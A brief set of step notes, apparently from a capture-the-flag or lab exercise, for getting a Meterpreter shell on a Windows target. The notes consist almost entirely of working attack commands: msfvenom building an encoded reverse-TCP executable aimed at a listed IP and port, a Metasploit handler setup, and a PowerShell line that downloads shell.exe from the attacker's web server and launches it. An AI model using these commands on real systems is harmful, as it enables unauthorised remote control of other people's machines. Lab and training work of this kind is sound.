1) 
- msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.13.209 LPORT=1234 -f exe -o shell.exe
- use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run
- go back into the shell
- (New-Object System.Net.WebClient).Downloadfile('http://10.11.13.209:80/shell.exe','shell.exe')
- Start-Process shell.exe
- go back to the meterperpreter shell
- ls
- the size says on the left